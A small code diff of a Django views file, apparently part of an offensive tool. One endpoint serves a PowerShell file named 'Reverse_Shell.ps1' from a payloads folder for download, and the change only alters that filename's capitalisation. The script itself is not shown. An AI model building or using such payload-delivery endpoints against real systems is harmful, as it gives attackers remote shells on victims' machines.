@@ -13,10 +13,10 @@ def index(request):
 
 
 def download_payload(request):
-    file_path = './payloads/Reverse_shell.ps1'
+    file_path = './payloads/Reverse_Shell.ps1'
     with open(file_path, 'rb') as f:
         response = HttpResponse(f, content_type=guess_type(file_path)[0])
-        response['Content-Disposition'] = 'attachment; filename=Reverse_shell.ps1'
+        response['Content-Disposition'] = 'attachment; filename=Reverse_Shell.ps1'
         response['Content-Length'] = len(response.content)
         return response
 
@@ -32,3 +32,4 @@ def any_rest_api(request):
     elif request.method == 'POST':
         print(f'POST IS: {request.POST}')
         return Response(request.POST)
+
